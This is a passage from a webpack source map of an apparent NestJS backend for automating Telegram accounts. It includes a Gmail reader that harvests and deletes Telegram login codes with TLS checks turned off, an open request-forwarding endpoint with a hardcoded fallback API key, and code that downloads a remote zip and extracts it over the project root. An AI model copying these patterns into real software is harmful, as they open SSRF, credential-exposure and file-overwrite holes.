W,EAAE,CAAC,QAAQ,CAAC,WAAW,CAAC;QAAE,OAAO,KAAK,CAAC;IACtE,MAAM,GAAG,GAAG,CAAC,KAAK,EAAE,OAAO,IAAI,EAAE,CAAC,CAAC,WAAW,EAAE,CAAC;IACjD,MAAM,IAAI,GAAG,KAAK,EAAE,IAAI,CAAC;IACzB,OAAO,CACL,GAAG,CAAC,QAAQ,CAAC,SAAS,CAAC;QACvB,GAAG,CAAC,QAAQ,CAAC,SAAS,CAAC;QACvB,GAAG,CAAC,QAAQ,CAAC,YAAY,CAAC;QAC1B,IAAI,KAAK,YAAY;QACrB,IAAI,KAAK,WAAW;QACpB,IAAI,KAAK,WAAW,CACrB,CAAC;AACJ,CAAC;;;;;;;;;;;AC3HD,2C;;;;;;;;;;ACAA,2C;;;;;;;;;;ACAA,yC;;;;;;;;;;ACAA,iD;;;;;;;;;;ACAA,6C;;;;;;;;;;ACAA,qD;;;;;;;;;;ACAA,4C;;;;;;;;;;ACAA,oC;;;;;;;;;;ACAA,kC;;;;;;;;;;ACAA,wC;;;;;;;;;;ACAA,kC;;;;;;;;;;ACAA,8C;;;;;;;;;;ACAA,4C;;;;;;;;;;ACAA,uC;;;;;;;;;;ACAA,sC;;;;;;;;;;ACAA,kC;;;;;;;;;;ACAA,iC;;;;;;;;;;ACAA,oC;;;;;;;;;;ACAA,mC;;;;;;;;;;ACAA,qC;;;;;;;;;;ACAA,mC;;;;;;;;;;ACAA,uC;;;;;;;;;;ACAA,6C;;;;;;;;;;ACAA,iC;;;;;;;;;;ACAA,2C;;;;;;;;;;ACAA,qC;;;;;;;;;;ACAA,6C;;;;;;;;;;ACAA,8C;;;;;;;;;;ACAA,oD;;;;;;;;;;ACAA,4C;;;;;;;;;;ACAA,uD;;;;;;;;;;ACAA,8C;;;;;;;;;;ACAA,wC;;;;;;;;;;ACAA,mC;;;;;;;;;;ACAA,+B;;;;;;;;;;ACAA,iC;;;;;;;;;;ACAA,gC;;;;;;UCAA;UACA;;UAEA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;UACA;;UAEA;UACA;;UAEA;UACA;UACA;;;;UE5BA;UACA;UACA;UACA","sources":[".././src/IMap/IMap.ts",".././src/app.controller.ts",".././src/app.module.ts",".././src/cloudinary.ts",".././src/components/ConfigurationInit/configuration.schema.ts",".././src/components/ConfigurationInit/index.ts",".././src/components/ConfigurationInit/init.controller.ts",".././src/components/ConfigurationInit/init.module.ts",".././src/components/ConfigurationInit/init.service.ts",".././src/components/Telegram/Telegram.controller.ts",".././src/components/Telegram/Telegram.module.ts",".././src/components/Telegram/Telegram.service.ts",".././src/components/Telegram/TelegramManager.ts",".././src/components/Telegram/config/telegram-validation.config.ts",".././src/components/Telegram/dto/batch-operations.dto.ts",".././src/components/Telegram/dto/channel-operation.dto.ts",".././src/components/Telegram/dto/connection-management.dto.ts",".././src/components/Telegram/dto/contact-management.dto.ts",".././src/components/Telegram/dto/create-bot.dto.ts",".././src/components/Telegram/dto/create-chat-folder.dto.ts",".././src/components/Telegram/dto/delete-chat.dto.ts",".././src/components/Telegram/dto/group-operations.dto.ts",".././src/components/Telegram/dto/index.ts",".././src/components/Telegram/dto/media-operations.dto.ts",".././src/components/Telegram/dto/message-search.dto.ts",".././src/components/Telegram/dto/metadata-operations.dto.ts",".././src/components/Telegram/dto/profile-settings.dto.ts",".././src/components/Telegram/dto/schedule-operations.dto.ts",".././src/components/Telegram/dto/send-message.dto.ts",".././src/components/Telegram/dto/update-profile.dto.ts",".././src/components/Telegram/dto/update-username.dto.ts",".././src/components/Telegram/dto/view-once-media.dto.ts",".././src/components/Telegram/index.ts",".././src/components/Telegram/manager/TelegramManager.ts",".././src/components/Telegram/manager/auth-operations.ts",".././src/components/Telegram/manager/channel-operations.ts",".././src/components/Telegram/manager/chat-operations.ts",".././src/components/Telegram/manager/client-operations.ts",".././src/components/Telegram/manager/contact-operations.ts",".././src/components/Telegram/manager/helpers.ts",".././src/components/Telegram/manager/index.ts",".././src/components/Telegram/manager/media-operations.ts",".././src/components/Telegram/manager/message-operations.ts",".././src/components/Telegram/manager/profile-operations.ts",".././src/components/Telegram/manager/types.ts",".././src/components/Telegram/utils/connection-manager.ts",".././src/components/Telegram/utils/deleteProfilePics.ts",".././src/components/Telegram/utils/generateTGConfig.ts",".././src/components/Telegram/utils/getProfilePics.ts",".././src/components/Telegram/utils/rate-limiter.ts",".././src/components/Telegram/utils/telegram-logger.ts",".././src/components/TgSignup/dto/index.ts",".././src/components/TgSignup/dto/tg-signup.dto.ts",".././src/components/TgSignup/index.ts",".././src/components/TgSignup/tg-signup.controller.ts",".././src/components/TgSignup/tg-signup.module.ts",".././src/components/TgSignup/tg-signup.service.ts",".././src/components/active-channels/active-channels.controller.ts",".././src/components/active-channels/active-channels.module.ts",".././src/components/active-channels/active-channels.service.ts",".././src/components/active-channels/dto/create-active-channel.dto.ts",".././src/components/active-channels/dto/index.ts",".././src/components/active-channels/dto/update-active-channel.dto.ts",".././src/components/active-channels/index.ts",".././src/components/active-channels/schemas/active-channel.schema.ts",".././src/components/active-channels/schemas/index.ts",".././src/components/bots/bots.controller.ts",".././src/components/bots/bots.module.ts",".././src/components/bots/bots.service.ts",".././src/components/bots/dto/create-bot.dto.ts",".././src/components/bots/dto/index.ts",".././src/components/bots/dto/media-extras.dto.ts",".././src/components/bots/dto/media-group.dto.ts",".././src/components/bots/dto/media.dto.ts",".././src/components/bots/dto/send-message.dto.ts",".././src/components/bots/index.ts",".././src/components/bots/schemas/bot.schema.ts",".././src/components/bots/schemas/index.ts",".././src/components/buffer-clients/buffer-client.controller.ts",".././src/components/buffer-clients/buffer-client.module.ts",".././src/components/buffer-clients/buffer-client.service.ts",".././src/components/buffer-clients/dto/create-buffer-client.dto.ts",".././src/components/buffer-clients/dto/index.ts",".././src/components/buffer-clients/dto/search-buffer-client.dto.ts",".././src/components/buffer-clients/dto/update-buffer-client.dto.ts",".././src/components/buffer-clients/index.ts",".././src/components/buffer-clients/schemas/buffer-client.schema.ts",".././src/components/buffer-clients/schemas/index.ts",".././src/components/builds/build.controller.ts",".././src/components/builds/build.module.ts",".././src/components/builds/build.service.ts",".././src/components/builds/builds.schema.ts",".././src/components/builds/index.ts",".././src/components/channels/channels.controller.ts",".././src/components/channels/channels.module.ts",".././src/components/channels/channels.service.ts",".././src/components/channels/dto/create-channel.dto.ts",".././src/components/channels/dto/index.ts",".././src/components/channels/dto/search-channel.dto.ts",".././src/components/channels/dto/update-channel.dto.ts",".././src/components/channels/index.ts",".././src/components/channels/schemas/channel.schema.ts",".././src/components/channels/schemas/index.ts",".././src/components/clients/client.controller.ts",".././src/components/clients/client.module.ts",".././src/components/clients/client.service.ts",".././src/components/clients/dto/create-client.dto.ts",".././src/components/clients/dto/index.ts",".././src/components/clients/dto/search-client.dto.ts",".././src/components/clients/dto/setup-client.dto.ts",".././src/components/clients/dto/update-client.dto.ts",".././src/components/clients/index.ts",".././src/components/clients/schemas/client.schema.ts",".././src/components/clients/schemas/index.ts",".././src/components/dynamic-data/dto/create-dynamic-data.dto.ts",".././src/components/dynamic-data/dto/get-dynamic-data.dto.ts",".././src/components/dynamic-data/dto/update-dynamic-data.dto.ts",".././src/components/dynamic-data/dynamic-data.controller.ts",".././src/components/dynamic-data/dynamic-data.module.ts",".././src/components/dynamic-data/dynamic-data.schema.ts",".././src/components/dynamic-data/dynamic-data.service.ts",".././src/components/dynamic-data/index.ts",".././src/components/index.ts",".././src/components/ip-management/dto/create-proxy-ip.dto.ts",".././src/components/ip-management/dto/search-ip.dto.ts",".././src/components/ip-management/dto/update-proxy-ip.dto.ts",".././src/components/ip-management/index.ts",".././src/components/ip-management/ip-management.controller.ts",".././src/components/ip-management/ip-management.module.ts",".././src/components/ip-management/ip-management.service.ts",".././src/components/ip-management/schemas/proxy-ip.schema.ts",".././src/components/n-point/index.ts",".././src/components/n-point/npoint.controller.ts",".././src/components/n-point/npoint.module.ts",".././src/components/n-point/npoint.service.ts",".././src/components/promote-clients/dto/create-promote-client.dto.ts",".././src/components/promote-clients/dto/index.ts",".././src/components/promote-clients/dto/search-promote-client.dto.ts",".././src/components/promote-clients/dto/update-promote-client.dto.ts",".././src/components/promote-clients/index.ts",".././src/components/promote-clients/promote-client.controller.ts",".././src/components/promote-clients/promote-client.module.ts",".././src/components/promote-clients/promote-client.service.ts",".././src/components/promote-clients/schemas/index.ts",".././src/components/promote-clients/schemas/promote-client.schema.ts",".././src/components/promote-msgs/index.ts",".././src/components/promote-msgs/promote-msgs.controller.ts",".././src/components/promote-msgs/promote-msgs.module.ts",".././src/components/promote-msgs/promote-msgs.schema.ts",".././src/components/promote-msgs/promote-msgs.service.ts",".././src/components/promote-stats/dto/create-promote-stat.dto.ts",".././src/components/promote-stats/dto/index.ts",".././src/components/promote-stats/dto/update-promote-stat.dto.ts",".././src/components/promote-stats/index.ts",".././src/components/promote-stats/promote-stat.controller.ts",".././src/components/promote-stats/promote-stat.module.ts",".././src/components/promote-stats/promote-stat.service.ts",".././src/components/promote-stats/schemas/index.ts",".././src/components/promote-stats/schemas/promote-stat.schema.ts",".././src/components/session-manager/client-registry.ts",".././src/components/session-manager/index.ts",".././src/components/session-manager/schemas/sessions.schema.ts",".././src/components/session-manager/session-audit.service.ts",".././src/components/session-manager/session.controller.ts",".././src/components/session-manager/session.module.ts",".././src/components/session-manager/session.service.ts",".././src/components/shared/client-helper.utils.ts",".././src/components/shared/dto/execute-request.dto.ts",".././src/components/shared/index.ts",".././src/components/stats/create-stat.dto.ts",".././src/components/stats/index.ts",".././src/components/stats/stat.controller.ts",".././src/components/stats/stat.module.ts",".././src/components/stats/stat.schema.ts",".././src/components/stats/stat.service.ts",".././src/components/stats/update-stat.dto.ts",".././src/components/stats2/create-stat2.dto.ts",".././src/components/stats2/index.ts",".././src/components/stats2/stat2.controller.ts",".././src/components/stats2/stat2.module.ts",".././src/components/stats2/stat2.schema.ts",".././src/components/stats2/stat2.service.ts",".././src/components/stats2/update-stat2.dto.ts",".././src/components/timestamps/index.ts",".././src/components/timestamps/timestamp.controller.ts",".././src/components/timestamps/timestamp.module.ts",".././src/components/timestamps/timestamp.service.ts",".././src/components/timestamps/timestamps.schema.ts",".././src/components/transactions/dto/create-transaction.dto.ts",".././src/components/transactions/dto/index.ts",".././src/components/transactions/dto/update-transaction.dto.ts",".././src/components/transactions/index.ts",".././src/components/transactions/schemas/transaction.schema.ts",".././src/components/transactions/transaction.controller.ts",".././src/components/transactions/transaction.module.ts",".././src/components/transactions/transaction.service.ts",".././src/components/upi-ids/index.ts",".././src/components/upi-ids/upi-ids.controller.ts",".././src/components/upi-ids/upi-ids.module.ts",".././src/components/upi-ids/upi-ids.schema.ts",".././src/components/upi-ids/upi-ids.service.ts",".././src/components/user-data/dto/create-user-data.dto.ts",".././src/components/user-data/dto/index.ts",".././src/components/user-data/dto/search-user-data.dto.ts",".././src/components/user-data/dto/update-user-data.dto.ts",".././src/components/user-data/index.ts",".././src/components/user-data/schemas/index.ts",".././src/components/user-data/schemas/user-data.schema.ts",".././src/components/user-data/user-data.controller.ts",".././src/components/user-data/user-data.module.ts",".././src/components/user-data/user-data.service.ts",".././src/components/users/dto/create-user.dto.ts",".././src/components/users/dto/index.ts",".././src/components/users/dto/search-user.dto.ts",".././src/components/users/dto/update-user.dto.ts",".././src/components/users/index.ts",".././src/components/users/schemas/index.ts",".././src/components/users/schemas/user.schema.ts",".././src/components/users/users.controller.ts",".././src/components/users/users.module.ts",".././src/components/users/users.service.ts",".././src/decorators/cloudflare-cache.decorator.ts",".././src/decorators/index.ts",".././src/decorators/no-cache.decorator.ts",".././src/guards/auth.guard.ts",".././src/guards/index.ts",".././src/interceptors/Exception-filter.ts",".././src/interceptors/cloudflare-cache.interceptor.ts",".././src/interceptors/index.ts",".././src/interceptors/timeout.interceptor.ts",".././src/interfaces/telegram.ts",".././src/main.ts",".././src/middlewares/logger.middleware.ts",".././src/processListeners.ts",".././src/utils/bot.service.instance.ts",".././src/utils/checkMe.utils.ts",".././src/utils/common.ts",".././src/utils/fetchWithTimeout.ts",".././src/utils/getRandomEmoji.ts",".././src/utils/index.ts",".././src/utils/isPermanentError.ts",".././src/utils/logbots.ts",".././src/utils/logger.ts",".././src/utils/obfuscateText.ts",".././src/utils/parseError.ts",".././src/utils/readbleTimeDifference.ts",".././src/utils/redisClient.ts",".././src/utils/telegram-utils/channelinfo.ts",".././src/utils/telegram-utils/index.ts",".././src/utils/tg-apps.ts",".././src/utils/withTimeout.ts","../external commonjs \"@nestjs/common\"","../external commonjs \"@nestjs/config\"","../external commonjs \"@nestjs/core\"","../external commonjs \"@nestjs/mapped-types\"","../external commonjs \"@nestjs/mongoose\"","../external commonjs \"@nestjs/platform-express\"","../external commonjs \"@nestjs/swagger\"","../external commonjs \"adm-zip\"","../external commonjs \"axios\"","../external commonjs \"big-integer\"","../external commonjs \"chalk\"","../external commonjs \"class-transformer\"","../external commonjs \"class-validator\"","../external commonjs \"cloudinary\"","../external commonjs \"form-data\"","../external commonjs \"https\"","../external commonjs \"imap\"","../external commonjs \"ioredis\"","../external commonjs \"lodash\"","../external commonjs \"mongoose\"","../external commonjs \"multer\"","../external commonjs \"node-cache\"","../external commonjs \"reflect-metadata\"","../external commonjs \"rxjs\"","../external commonjs \"rxjs/operators\"","../external commonjs \"telegram\"","../external commonjs \"telegram/Helpers\"","../external commonjs \"telegram/Password\"","../external commonjs \"telegram/client/uploads\"","../external commonjs \"telegram/events\"","../external commonjs \"telegram/extensions/Logger\"","../external commonjs \"telegram/sessions\"","../external commonjs \"telegram/tl\"","../external node-commonjs \"crypto\"","../external node-commonjs \"fs\"","../external node-commonjs \"path\"","../external node-commonjs \"url\"","../webpack/bootstrap","../webpack/before-startup","../webpack/startup","../webpack/after-startup"],"sourcesContent":["import Imap from 'imap';\nimport { fetchNumbersFromString, sleep } from '../utils';\nimport { parseError } from '../utils/parseError';\n\nexport class MailReader {\n    private static instance: MailReader;\n    private imap: Imap;\n    private isReady: boolean = false;\n    private result: string = '';\n\n    private constructor() {\n        this.imap = new Imap({\n            user: process.env.GMAIL_ADD || '',\n            password: process.env.GMAIL_PASS || '',\n            host: 'imap.gmail.com',\n            port: 993,\n            tls: true,\n            tlsOptions: {\n                rejectUnauthorized: false,\n            },\n        });\n\n        this.imap.on('ready', () => {\n            console.log('Mail is Ready');\n            this.isReady = true;\n        });\n\n        this.imap.on('error', (err: Error) => {\n            console.error('SomeError:', err);\n            this.isReady = false;\n        });\n\n        this.imap.on('end', () => {\n            console.log('Connection ended');\n            this.isReady = false;\n        });\n    }\n\n    public static getInstance(): MailReader {\n        if (!MailReader.instance) {\n            MailReader.instance = new MailReader();\n        }\n        return MailReader.instance;\n    }\n\n    public async connectToMail(): Promise<void> {\n        console.log('Connecting to mail server');\n        try {\n            this.imap.connect();\n            this.isReady = true;\n            console.log('Connected to mail server');\n        } catch (err) {\n            console.error('Error connecting to mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async disconnectFromMail(): Promise<void> {\n        console.log('Disconnecting from mail server');\n        try {\n            this.imap.end();\n            this.isReady = false;\n            console.log('Disconnected from mail server');\n        } catch (err) {\n            console.error('Error disconnecting from mail server:', parseError(err));\n            throw err;\n        }\n    }\n\n    public async isMailReady(): Promise<boolean> {\n        return this.isReady;\n    }\n\n    public async getCode(): Promise<string> {\n        console.log(\"MailReady : \", this.isReady)\n        if (!this.isReady) {\n            console.log(\"Re-Connecting mail server\");\n            await this.connectToMail();\n            await sleep(10000);\n        }\n\n        try {\n            await this.openInbox();\n\n            const searchCriteria = [['FROM', 'noreply@telegram.org']];\n            const fetchOptions = { bodies: ['HEADER', 'TEXT'], markSeen: true };\n            console.log('Inbox Opened');\n\n            const results = await new Promise<any[]>((resolve, reject) => {\n                this.imap.search(searchCriteria, (err, results) => {\n                    if (err) {\n                        console.error('Search error:', parseError(err));\n                        reject(err);\n                    } else {\n                        resolve(results);\n                    }\n                });\n            });\n\n            if (results.length > 0) {\n                console.log('Emails found:', results.length);\n                const length = results.length;\n                const fetch = this.imap.fetch([results[length - 1]], fetchOptions);\n\n                await new Promise<void>((resolve, reject) => {\n                    fetch.on('message', (msg, seqno) => {\n                        const emailData: string[] = [];\n\n                        msg.on('body', (stream, info) => {\n                            let buffer = '';\n                            stream.on('data', (chunk) => buffer += chunk.toString('utf8'));\n                            stream.on('end', () => {\n                                if (info.which === 'TEXT') {\n                                    emailData.push(buffer);\n                                }\n                                this.imap.seq.addFlags([seqno], '\\\\Deleted', (err) => {\n                                    if (err) reject(err);\n                                    this.imap.expunge((err) => {\n                                        if (err) reject(err);\n                                        console.log('Deleted message');\n                                    });\n                                });\n                            });\n                        });\n\n                        msg.once('end', () => {\n                            console.log(`Email #${seqno}, Latest ${results[length - 1]}`);\n                            console.log('EmailDataLength:', emailData.length);\n                            console.log('Mail:', emailData[emailData.length - 1].split('.'));\n                            this.result = fetchNumbersFromString(emailData[emailData.length - 1].split('.')[0]);\n                            resolve();\n                        });\n                    });\n\n                    fetch.once('end', () => {\n                        console.log('Fetched mails');\n                        resolve();\n                    });\n                });\n            } else {\n                console.log('No new emails found');\n            }\n\n            console.log('Returning result:', this.result);\n            return this.result;\n        } catch (error) {\n            console.error('Error:', error);\n            this.isReady = false;\n            throw error;\n        }\n    }\n\n    private async openInbox(): Promise<void> {\n        await new Promise<void>((resolve, reject) => {\n            this.imap.openBox('INBOX', false, (err) => {\n                if (err) {\n                    console.error('Open Inbox error:', parseError(err));\n                    reject(err);\n                } else {\n                    console.log('Inbox opened');\n                    resolve();\n                }\n            });\n        });\n    }\n}","import { Controller, Get, Post, Body, ValidationPipe, HttpException, HttpStatus, Res } from '@nestjs/common';\r\nimport { ApiOperation, ApiResponse, ApiTags } from '@nestjs/swagger';\r\nimport axios, { AxiosError, AxiosResponse } from 'axios';\r\nimport { ExecuteRequestDto } from './components/shared/dto/execute-request.dto';\r\nimport { randomUUID } from 'crypto';\r\nimport { Request, Response } from 'express';\r\nimport * as https from 'https';\r\nimport { URL } from 'url';\r\nimport { parseError , Logger} from './utils';\r\n\r\n@ApiTags('App')\r\n@Controller()\r\nexport class AppController {\r\n  private readonly logger = new Logger(AppController.name);\r\n  private readonly DEFAULT_TIMEOUT = 30000;\r\n  private readonly MAX_CONTENT_SIZE = 50 * 1024 * 1024; // 50MB\r\n\r\n  constructor() { }\r\n\r\n  @Get()\r\n  getHello(): string {\r\n    return 'Hello World!';\r\n  }\r\n  @Post('execute-request')\r\n  @ApiOperation({\r\n    summary: 'Execute an HTTP request with given details',\r\n    description: 'Makes an HTTP request to the specified URL with provided configuration and returns the response'\r\n  })\r\n  @ApiResponse({ status: 201, description: 'Request executed successfully' })\r\n  @ApiResponse({ status: 400, description: 'Invalid request parameters' })\r\n  @ApiResponse({ status: 429, description: 'Too many requests' })\r\n  @ApiResponse({ status: 500, description: 'Internal server error or request execution failed' })\r\n  async executeRequest(\r\n    @Body(new ValidationPipe({\r\n      transform: true,\r\n      forbidNonWhitelisted: true,\r\n      whitelist: true\r\n    })) req: ExecuteRequestDto,\r\n    @Res() res: Response\r\n  ): Promise<any> {\r\n    const requestId = randomUUID();\r\n    const startTime = Date.now();\r\n\r\n    try {\r\n      const {\r\n        url,\r\n        method = 'GET',\r\n        headers = {},\r\n        data,\r\n        params,\r\n        responseType = 'json',\r\n        timeout = this.DEFAULT_TIMEOUT,\r\n        followRedirects = true,\r\n        maxRedirects = 5\r\n      } = req;\r\n\r\n      // Basic validation\r\n      if (!url) {\r\n        throw new HttpException('URL is required', HttpStatus.BAD_REQUEST);\r\n      }\r\n\r\n      try {\r\n        const parsedUrl = new URL(url);\r\n        if (!['http:', 'https:'].includes(parsedUrl.protocol)) {\r\n          throw new HttpException(\r\n            'Invalid URL protocol. Only HTTP and HTTPS are supported.',\r\n            HttpStatus.BAD_REQUEST\r\n          );\r\n        }\r\n      } catch (error) {\r\n        throw new HttpException('Invalid URL format', HttpStatus.BAD_REQUEST);\r\n      }\r\n\r\n      // Positive case start log (basic)\r\n      this.logger.log(`[${requestId}] Starting HTTP ${method} request to ${url}`);\r\n\r\n      const httpsAgent = new https.Agent({\r\n        rejectUnauthorized: true\r\n      });\r\n\r\n      const response: AxiosResponse = await axios({\r\n        url,\r\n        method,\r\n        headers: {\r\n          ...headers,\r\n          'x-api-key': process.env.X_API_KEY || 'santoor',\r\n        },\r\n        data,\r\n        params,\r\n        responseType,\r\n        timeout,\r\n        maxRedirects: followRedirects ? maxRedirects : 0,\r\n        maxContentLength: this.MAX_CONTENT_SIZE,\r\n        maxBodyLength: this.MAX_CONTENT_SIZE,\r\n        validateStatus: null,\r\n        decompress: true,\r\n        httpsAgent,\r\n        transitional: {\r\n          clarifyTimeoutError: true\r\n        }\r\n      });\r\n\r\n      const executionTime = Date.now() - startTime;\r\n\r\n      // Positive case completion log (basic)\r\n      this.logger.log(`[${requestId}] Completed in ${executionTime}ms with status ${response.status}`);\r\n\r\n      // Set response headers except transfer-encoding\r\n      Object.entries(response.headers).forEach(([key, value]) => {\r\n        if (key.toLowerCase() === 'transfer-encoding') return;\r\n        if (Array.isArray(value)) {\r\n          res.setHeader(key, value);\r\n        } else if (value) {\r\n          res.setHeader(key, value.toString());\r\n        }\r\n      });\r\n\r\n      res.status(response.status);\r\n\r\n      if (this.isBinaryResponse(responseType, response.headers['content-type'])) {\r\n        if (!res.getHeader('content-type') && response.headers['content-type']) {\r\n          res.setHeader('content-type', response.headers['content-type']);\r\n        }\r\n        res.send(Buffer.from(response.data));\r\n      } else {\r\n        res.send(response.data);\r\n      }\r\n      return;\r\n\r\n    } catch (error) {\r\n      const executionTime = Date.now() - startTime;\r\n      parseError(error, `Failed to Execute Request: ${req.url} | Method: ${req.method?.toUpperCase()}`)\r\n      // Detailed negative case log\r\n      this.logger.error({\r\n        message: `[${requestId}] Request failed after ${executionTime}ms`,\r\n        requestId,\r\n        request: {\r\n          url: req.url,\r\n          method: req.method || 'GET',\r\n          params: req.params,\r\n          headers: this.sanitizeHeaders(req.headers || {}),\r\n          timeout: req.timeout || this.DEFAULT_TIMEOUT,\r\n          responseType: req.responseType || 'json'\r\n        },\r\n        error: {\r\n          name: error.name,\r\n          message: error.message,\r\n          stack: error.stack,\r\n          code: error.code,\r\n          status: error.response?.status,\r\n          responseData: error.response?.data\r\n        }\r\n      });\r\n\r\n      const errorDetails = this.handleRequestError(error, requestId);\r\n\r\n      res.status(errorDetails.status || HttpStatus.INTERNAL_SERVER_ERROR);\r\n      res.send(errorDetails);\r\n      return;\r\n    }\r\n  }\r\n\r\n\r\n  private sanitizeHeaders(headers: Record<string, string>): Record<string, string> {\r\n    const sensitiveHeaders = ['authorization', 'cookie', 'proxy-authorization'];\r\n    const sanitized = { ...headers };\r\n\r\n    // Redact sensitive headers\r\n    sensitiveHeaders.forEach(header => {\r\n      Object.keys(sanitized).forEach(key => {\r\n        if (key.toLowerCase() === header.toLowerCase()) {\r\n          sanitized[key] = '[REDACTED]';\r\n        }\r\n      });\r\n    });\r\n\r\n    return sanitized;\r\n  }\r\n\r\n  private isBinaryResponse(responseType: string, contentType?: string): boolean {\r\n    if (responseType === 'arraybuffer') return true;\r\n\r\n    if (contentType) {\r\n      const binaryTypes = [\r\n        'application/octet-stream',\r\n        'image/',\r\n        'audio/',\r\n        'video/',\r\n        'application/pdf',\r\n        'application/zip',\r\n        'application/x-zip-compressed',\r\n        'application/binary'\r\n      ];\r\n\r\n      return binaryTypes.some(type => contentType.toLowerCase().includes(type.toLowerCase()));\r\n    }\r\n\r\n    return false;\r\n  }\r\n\r\n  private handleRequestError(error: any, requestId: string): any {\r\n    if (axios.isAxiosError(error)) {\r\n      const axiosError = error as AxiosError;\r\n\r\n      // Handle specific error types\r\n      if (axiosError.code === 'ECONNABORTED') {\r\n        return {\r\n          status: HttpStatus.GATEWAY_TIMEOUT,\r\n          error: 'Request timeout',\r\n          message: 'The request took too long to complete',\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.code === 'ECONNREFUSED') {\r\n        return {\r\n          status: HttpStatus.BAD_GATEWAY,\r\n          error: 'Connection refused',\r\n          message: 'Could not connect to the target server',\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.response) {\r\n        return {\r\n          status: axiosError.response.status,\r\n          headers: this.sanitizeHeaders(axiosError.response.headers as Record<string, string>),\r\n          data: axiosError.response.data,\r\n          requestId\r\n        };\r\n      }\r\n\r\n      if (axiosError.request) {\r\n        return {\r\n          status: HttpStatus.BAD_GATEWAY,\r\n          error: 'No response',\r\n          message: 'The request was made but no response was received',\r\n          code: axiosError.code,\r\n          requestId\r\n        };\r\n      }\r\n\r\n      return {\r\n        status: HttpStatus.BAD_GATEWAY,\r\n        error: axiosError.code || 'Request failed',\r\n        message: axiosError.message,\r\n        requestId\r\n      };\r\n    }\r\n\r\n    // Handle non-Axios errors\r\n    return {\r\n      status: HttpStatus.INTERNAL_SERVER_ERROR,\r\n      error: 'Internal server error',\r\n      message: error.message || 'An unexpected error occurred',\r\n      requestId\r\n    };\r\n  }\r\n}\r\n","import { MiddlewareConsumer, Module, NestModule } from '@nestjs/common';\nimport { UsersModule } from './components/users/users.module';\nimport { UserDataModule } from './components/user-data/user-data.module';\nimport { ClientModule } from './components/clients/client.module';\nimport { TelegramModule } from './components/Telegram/Telegram.module';\nimport { BufferClientModule } from './components/buffer-clients/buffer-client.module';\nimport { ActiveChannelsModule } from './components/active-channels/active-channels.module';\nimport { InitModule } from './components/ConfigurationInit/init.module';\nimport { ChannelsModule } from './components/channels/channels.module';\nimport { AppController } from './app.controller';\nimport { LoggerMiddleware } from './middlewares/logger.middleware';\nimport { BuildModule } from './components/builds/build.module';\nimport { UpiIdModule } from './components/upi-ids/upi-ids.module';\nimport { PromoteMsgModule } from './components/promote-msgs/promote-msgs.module';\nimport { StatModule } from './components/stats/stat.module';\nimport { Stat2Module } from './components/stats2/stat2.module';\nimport { PromoteStatModule } from './components/promote-stats/promote-stat.module';\nimport { PromoteClientModule } from './components/promote-clients/promote-client.module';\nimport { TgSignupModule } from './components/TgSignup/tg-signup.module';\nimport { TransactionModule } from './components/transactions/transaction.module';\nimport { NpointModule } from './components/n-point/npoint.module';\nimport { TimestampModule } from './components/timestamps/timestamp.module';\nimport { DynamicDataModule } from './components/dynamic-data/dynamic-data.module';\nimport { SessionModule } from './components/session-manager';\nimport { IpManagementModule } from './components/ip-management/ip-management.module';\nimport { APP_GUARD , APP_FILTER} from '@nestjs/core';\nimport { AuthGuard } from './guards';\nimport { BotsModule } from './components';\nimport { ExceptionsFilter } from './interceptors';\n\n@Module({\n  imports: [\n    InitModule,\n    TelegramModule,\n    BotsModule,\n    ActiveChannelsModule,\n    ClientModule,\n    SessionModule,\n    IpManagementModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    BuildModule,\n    UpiIdModule,\n    PromoteMsgModule,\n    PromoteStatModule,\n    StatModule,\n    Stat2Module,\n    TgSignupModule,\n    TransactionModule,\n    NpointModule,\n    TimestampModule,\n    DynamicDataModule,\n  ],\n  providers: [\n    {\n      provide: APP_GUARD,\n      useClass: AuthGuard,\n    },\n    {\n      provide: APP_FILTER,\n      useClass: ExceptionsFilter\n    },\n  ],\n  controllers: [AppController],\n  exports: [\n    TelegramModule,\n    ActiveChannelsModule,\n    ClientModule,\n    UserDataModule,\n    UsersModule,\n    BufferClientModule,\n    ChannelsModule,\n    PromoteClientModule,\n    TgSignupModule,\n    TransactionModule,\n    TimestampModule,\n  ]\n})\nexport class AppModule implements NestModule {\n  configure(consumer: MiddlewareConsumer) {\n    consumer.apply(LoggerMiddleware).forRoutes('*');\n  }\n}","import * as cloudinary from 'cloudinary';\nimport * as path from 'path';\nimport * as fs from 'fs';\nimport AdmZip from 'adm-zip';\nimport { parseError } from './utils/parseError';\nimport { fetchWithTimeout } from './utils/fetchWithTimeout';\nexport class CloudinaryService {\n    static instance;\n    resources = new Map();\n    constructor() {\n        cloudinary.v2.config({\n            cloud_name: process.env.CL_NAME,\n            api_key: process.env.CL_APIKEY,\n            api_secret: process.env.CL_APISECRET\n        });\n    }\n\n    static async getInstance(name) {\n        if (!CloudinaryService.instance) {\n            CloudinaryService.instance = new CloudinaryService();\n        }\n        await CloudinaryService.instance.getResourcesFromFolder(name);\n        return CloudinaryService.instance;\n    }\n\n    public async downloadAndExtractZip(url: string) {\n        const rootPath = process.cwd();\n        const zipPath = path.resolve(rootPath, 'temp.zip');\n        const extractPath = path.resolve(rootPath);\n    \n        console.log(`Starting download of zip file from ${url}`);\n        // Download the zip file\n        const response = await fetchWithTimeout(url, { responseType: 'arraybuffer' });\n        if (response?.status === 200) {\n            console.log('Zip file downloaded successfully.');\n            fs.writeFileSync(zipPath, response.data);\n            console.log(`Zip file saved to ${zipPath}`);\n            \n            // Extract the zip file using adm-zip\n            const zip = new AdmZip(zipPath);\n            console.log(`Extracting zip file to ${extractPath}`);\n            zip.extractAllTo(extractPath, true);\n            console.log('Zip file extracted successfully.');\n            \n            fs.unlinkSync(zipPath); // Remove the zip file after extraction\n            console.log(`Temporary zip file ${zipPath} deleted.`);\n        } else {\n            const errorMessage = `Unable to download zip file from ${url}`;\n            console.error(errorMessage);\n            throw new Error(errorMessage);\n        }\n    }\n\n    async getResourcesFromFolder(folderName) {\n        console.log('FETCHING NEW FILES!! from CLOUDINARY');\n        await this.downloadAndExtractZip(`https://cms.paidgirl.site/folders/${folderName}/files/download-all`);\n        // await this.findAndSaveResources(folderName, 'image');\n    }\n\n    async 